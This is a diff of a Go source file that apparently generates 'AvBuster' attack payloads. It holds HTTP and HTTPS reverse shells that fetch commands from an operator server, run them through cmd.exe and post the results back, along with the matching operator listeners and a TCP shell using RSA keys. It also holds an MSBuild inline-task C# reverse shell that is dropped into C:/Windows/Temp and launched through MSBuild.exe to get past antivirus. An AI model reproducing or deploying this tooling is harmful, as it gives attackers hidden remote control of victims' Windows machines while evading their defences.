@@ -644,7 +644,6 @@ func main() {
 
 	var osshell string
 	//var osshellargs []string
-	//fmt.Println("Got a Shadow from ...")
 	revserver := "http://REVIPPORT"
 
 	client := &http.Client{}
@@ -659,7 +658,7 @@ func main() {
 
 		doc, err := goquery.NewDocumentFromResponse(response)
 		checkerr(err)
-		cnt, _ := doc.Find("form div div div input").Attr("value")
+		cnt, _ := doc.Find("form input").Attr("value")
 
 		if strings.TrimSpace(cnt) == "" {
 			cnt = "ipconfig"
@@ -703,8 +702,6 @@ import (
 	"html/template"
 	"net/http"
 	"os"
-	"strings"
-
 	"github.com/fatih/color"
 )
 
@@ -715,10 +712,17 @@ type ServCommand struct {
 
 var commandtopost ServCommand
 var servtemplate *template.Template
+var owntemplate string
 
 func init() {
-	commandtopost = ServCommand{}
-	servtemplate = template.Must(template.ParseFiles("templates/servtemplate.html"))
+	owntemplate = RPL<!DOCTYPE html>
+	<html>
+	<body>
+	<form action="" method="post" id="cmdform" name="cmdform">
+		<input type="text" class="form-control" name="cmd" id="cmd" value= {{.Command}}>
+	</form>
+	</body>
+	</html>RPL
 }
 
 func checkerr(err error) {
@@ -728,7 +732,9 @@ func checkerr(err error) {
 }
 
 func main() {
-	//fmt.Println("Got shadow from ...")
+	templategeneration()
+	commandtopost = ServCommand{}
+	servtemplate = template.Must(template.ParseFiles("owntemplate.html"))
 	http.HandleFunc("/", index)
 	err := http.ListenAndServe(":REVPRT", nil)
 	checkerr(err)
@@ -737,13 +743,13 @@ func main() {
 func index(respwrt http.ResponseWriter, req *http.Request) {
 	redc := color.New(color.FgHiRed, color.Bold)
 	greenc := color.New(color.FgHiGreen, color.Bold)
-	cyanc := color.New(color.FgCyan, color.Bold)
+	//cyanc := color.New(color.FgCyan, color.Bold)
 	if req.Method == "POST" {
 		err := req.ParseForm()
 		checkerr(err)
 		cmdres := req.Form.Get("cmdres")
 		commandtopost.Commandres = cmdres
-		redc.Println("You have a message from Victim...")
+		redc.Println("Message from AVBUSTER TUNNEL...")
 		greenc.Println(commandtopost.Commandres)
 		err = servtemplate.Execute(respwrt, commandtopost)
 		checkerr(err)
@@ -754,12 +760,33 @@ func index(respwrt http.ResponseWriter, req *http.Request) {
 		redc.Printf("[AvBusterHTTPShell]")
 		reader := bufio.NewReader(os.Stdin)
 		cmdtopost, _ := reader.ReadString('\n')
-		cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to client.")
+		//cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to client.")
 		commandtopost.Command = cmdtopost
 		err := servtemplate.Execute(respwrt, commandtopost)
 		checkerr(err)
 	}
-}`
+}
+func templategeneration() {
+	if !fileexists("owntemplate.html") {
+		templatefile, err := os.Create("owntemplate.html")
+		if err != nil {
+			fmt.Println(err)
+		}
+		templatefile.WriteString(owntemplate)
+		templatefile.Close()
+	}
+}
+func fileexists(fname string) bool {
+	_, err := os.Stat(fname)
+	var exists bool
+	if err == nil {
+		exists = true
+	} else if os.IsNotExist(err) {
+		exists = false
+	}
+	return exists
+}
+`
 
 var AvBusterTCPHybridReverseShell = `package main
 
@@ -788,10 +815,10 @@ const BUFFSIZE = 512
 const MASKMANAGERIP = "REVIPPORT"
 
 //PUBLIC KEY
-var MNGRPUBLICKEY = []byte("PUBKEY")
+var MNGRPUBLICKEY = []byte(RPLPUBKEYRPL)
 
 //PRIVATE KEY
-var PRIVATEKEY = []byte("PVTKEY")
+var PRIVATEKEY = []byte(RPLPVTKEYRPL)
 
 func main() {
 	conn, err := net.Dial("tcp", MASKMANAGERIP)
@@ -996,10 +1023,10 @@ import (
 // FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
 const FILEREADBUFFSIZE = 512
 
-//const LOCALPORT = ":REVPRT"
-const LOCALPORT = ":443"
+const LOCALPORT = ":REVPRT"
+//const LOCALPORT = ":443"
 
-var SHELLPUBLICKEY = []byte("CLIENTPUBKEY")
+var SHELLPUBLICKEY = []byte(RPLPUBKEYRPL)
 
 func main() {
 	redc := color.New(color.FgHiRed, color.Bold)
@@ -1108,18 +1135,6 @@ func encryptMessage(origData []byte) ([]byte, error) {
 	}
 	pub := pubInterface.(*rsa.PublicKey)
 	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
-}
-
-func decryptMessage(ciphertext []byte) ([]byte, error) {
-	block, _ := pem.Decode(PRIVATEKEY)
-	if block == nil {
-		return nil, errors.New("private key error!")
-	}
-	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
-	if err != nil {
-		return nil, err
-	}
-	return rsa.DecryptPKCS1v15(rand.Reader, priv, ciphertext)
 }
 
 func decryptconnection(keyval, texttodecrypt string) string {
@@ -1575,7 +1590,7 @@ const MANAGERIP = "RHOST"
 const REMOTEPORT = "RPORT"
 
 func init() {
-	tdu = "<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	tdu = RPL<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 <Target Name="tdu">
 <tdu/>
 </Target>
@@ -1651,8 +1666,8 @@ func init() {
         </Code>      
       </Task>
 </UsingTask>
-</Project>"
-	msbuildpath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"
+</Project>RPL
+	msbuildpath = RPLC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exeRPL
 }
 
 func checkerr(err error) {
@@ -1849,8 +1864,8 @@ func main() {
 
 	var osshell string
 	//var osshellargs []string
-	//fmt.Println("Got a Shadow from ...")
-	shadowserver := "https://REVIPPORT"
+	//fmt.Println("Got a avbuster from ...")
+	avbusterserver := "https://REVIPPORT"
 
 	trp := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
@@ -1860,7 +1875,7 @@ func main() {
 
 	for {
 
-		response, err := client.Get(shadowserver)
+		response, err := client.Get(avbusterserver)
 		checkerr(err)
 		defer response.Body.Close()
 		//cnt2, _ := ioutil.ReadAll(response.Body)
@@ -1868,7 +1883,7 @@ func main() {
 
 		doc, err := goquery.NewDocumentFromResponse(response)
 		checkerr(err)
-		cnt, _ := doc.Find("form div div div input").Attr("value")
+		cnt, _ := doc.Find("form input").Attr("value")
 
 		if strings.TrimSpace(cnt) == "" {
 			cnt = "ipconfig"
@@ -1878,7 +1893,7 @@ func main() {
 		//fmt.Println(command)
 
 		if command == "bye" {
-			client.PostForm(shadowserver, url.Values{"cmd": {command}, "cmdres": {"Shadow leaves :("}})
+			client.PostForm(avbusterserver, url.Values{"cmd": {command}, "cmdres": {"avbuster leaves :("}})
 			os.Exit(0)
 		} else {
 			osshellargs := []string{"/C", command}
@@ -1895,8 +1910,8 @@ func main() {
 
 			out, _ := execcmd.Output()
 			//fmt.Println(string(out))
-			client.PostForm(shadowserver, url.Values{"cmd": {command}, "cmdres": {string(out)}})
-			//client.PostForm(shadowserver, url.Values{"cmd": {command}})
+			client.PostForm(avbusterserver, url.Values{"cmd": {command}, "cmdres": {string(out)}})
+			//client.PostForm(avbusterserver, url.Values{"cmd": {command}})
 			time.Sleep(3 * time.Second)
 		}
 
@@ -1912,7 +1927,6 @@ import (
 	"html/template"
 	"net/http"
 	"os"
-	"strings"
 
 	"github.com/fatih/color"
 )
@@ -1920,17 +1934,26 @@ import (
 //REVPRT set server port here
 const PORT = ":REVPRT"
 
-type ShadowCommand struct {
+var owntemplate string
+
+type avbusterCommand struct {
 	Command    string
 	Commandres string
 }
 
-var shadowcommandtopost ShadowCommand
-var shadowtemplate *template.Template
+var avbustercommandtopost avbusterCommand
+var avbustertemplate *template.Template
 
 func init() {
-	shadowcommandtopost = ShadowCommand{}
-	shadowtemplate = template.Must(template.ParseFiles("templates/shadow.html"))
+	owntemplate = RPL<!DOCTYPE html>
+	<html>
+	<body>
+	<form action="" method="post" id="cmdform" name="cmdform">
+		<input type="text" class="form-control" name="cmd" id="cmd" value= {{.Command}}>
+	</form>
+	</body>
+	</html>RPL
+
 }
 
 func checkerr(err error) {
@@ -1940,148 +1963,59 @@ func checkerr(err error) {
 }
 
 func main() {
-	//fmt.Println("Got shadow from ...")
+	templategeneration()
+	avbustercommandtopost = avbusterCommand{}
+	avbustertemplate = template.Must(template.ParseFiles("owntemplate.html"))
 	http.HandleFunc("/", index)
 	err := http.ListenAndServeTLS(PORT, "server.crt", "server.key", nil)
 	checkerr(err)
 }
 
+func templategeneration() {
+	if !fileexists("owntemplate.html") {
+		templatefile, err := os.Create("owntemplate.html")
+		if err != nil {
+			fmt.Println(err)
+		}
+		templatefile.WriteString(owntemplate)
+		templatefile.Close()
+	}
+}
+func fileexists(fname string) bool {
+	_, err := os.Stat(fname)
+	var exists bool
+	if err == nil {
+		exists = true
+	} else if os.IsNotExist(err) {
+		exists = false
+	}
+	return exists
+}
+
 func index(respwrt http.ResponseWriter, req *http.Request) {
 	redc := color.New(color.FgHiRed, color.Bold)
 	greenc := color.New(color.FgHiGreen, color.Bold)
-	cyanc := color.New(color.FgCyan, color.Bold)
+	//cyanc := color.New(color.FgCyan, color.Bold)
 	if req.Method == "POST" {
 		err := req.ParseForm()
 		checkerr(err)
 		cmdres := req.Form.Get("cmdres")
-		shadowcommandtopost.Commandres = cmdres
-		redc.Println("You have a message from Shadow...")
-		greenc.Println(shadowcommandtopost.Commandres)
-		err = shadowtemplate.Execute(respwrt, shadowcommandtopost)
+		avbustercommandtopost.Commandres = cmdres
+		redc.Println("Message from AVBUSTER TUNNEL...")
+		greenc.Println(avbustercommandtopost.Commandres)
+		err = avbustertemplate.Execute(respwrt, avbustercommandtopost)
 		checkerr(err)
 
 		//content, _ := ioutil.ReadAll(req.Body)
 		//fmt.Println(string(content))
 	} else {
-		redc.Printf("[https]")
+		redc.Printf("[AvBusterHTTPSTunnel]")
 		reader := bufio.NewReader(os.Stdin)
 		cmdtopost, _ := reader.ReadString('\n')
-		cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to Shadow.")
-		shadowcommandtopost.Command = cmdtopost
-		err := shadowtemplate.Execute(respwrt, shadowcommandtopost)
+		//cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to avbuster.")
+		avbustercommandtopost.Command = cmdtopost
+		err := avbustertemplate.Execute(respwrt, avbustercommandtopost)
 		checkerr(err)
 	}
 }
 `
-var AvBusterMSXmlXsltTCPReverseShell = `package main
-
-import (
-	"fmt"
-	"os"
-	"os/exec"
-	"strings"
-)
-
-var tdu, msbuildpath string
-
-func init() {
-	tdu = RPL<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-<Target Name="tdu">
-<tdu/>
-</Target>
-<UsingTask
-    TaskName="tdu"
-    TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
-      <Task>
-      
-      <Reference Include="System.Management.Automation" />
-        <Code Type="Class" Language="cs">
-         <![CDATA[
-            using System;
-            using System.Diagnostics;
-            using System.IO;
-            using System.Net.Sockets;
-            using System.Text;
-            using System.Management.Automation;
-            using System.Management.Automation.Runspaces;
-            using Microsoft.Build.Framework;
-            using Microsoft.Build.Utilities;
-            using System.Collections.ObjectModel;
-            public class tdu : Task, ITask
-            {
-                public static StreamWriter streamWriter;
-                 public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
-                 {
-                        StringBuilder strOutput = new StringBuilder();
-                        if (!String.IsNullOrEmpty(outLine.Data))
-                        {
-                            try
-                            {
-                                strOutput.Append(outLine.Data);
-                                streamWriter.WriteLine(strOutput);
-                                streamWriter.Flush();
-                            }
-                            catch (Exception ex) { throw ex; }
-                        }
-                 }
-                 public override bool Execute()
-                 {
-                     using (TcpClient client = new TcpClient("IP", PORT))
-                        {
-                            using (Stream stream = client.GetStream())
-                            {
-                                using (StreamReader rdr = new StreamReader(stream))
-                                {
-                                    streamWriter = new StreamWriter(stream);
-                                    StringBuilder strInput = new StringBuilder();
-                                    Process p = new Process();
-                                    p.StartInfo.FileName = "cmd.exe";
-                                    p.StartInfo.CreateNoWindow = true;
-                                    p.StartInfo.UseShellExecute = false;
-                                    p.StartInfo.RedirectStandardOutput = true;
-                                    p.StartInfo.RedirectStandardInput = true;
-                                    p.StartInfo.RedirectStandardError = true;
-                                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-                                    p.Start();
-                                    p.BeginOutputReadLine();
-                                    while (true)
-                                    {
-                                        strInput.Append(rdr.ReadLine());
-                                        p.StandardInput.WriteLine(strInput);
-                                        strInput.Remove(0, strInput.Length);
-                                    }
-                                }
-                            }
-                        }
-                 }
-            
-            }
-         ]]>
-        </Code>      
-      </Task>
-</UsingTask>
-</Project>RPL
-	msbuildpath = RPLC:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exeRPL
-}
-func checkerr(err error) {
-	fmt.Println(err)
-}
-
-func main() {
-	createmsbuildtemplate("REVIP", "REVPRT")
-	msbuild := exec.Command(msbuildpath, "C:/Windows/Temp/tdu.xml")
-	err := msbuild.Start()
-	checkerr(err)
-}
-
-func createmsbuildtemplate(ip, port string) {
-
-	ipreplaced := strings.Replace(tdu, "IP", ip, 1)
-	portreplaced := strings.Replace(ipreplaced, "PORT", port, 1)
-
-	fotduxml, err := os.Create("C:/Windows/Temp/tdu.xml")
-	checkerr(err)
-	defer fotduxml.Close()
-	fotduxml.WriteString(portreplaced)
-}`
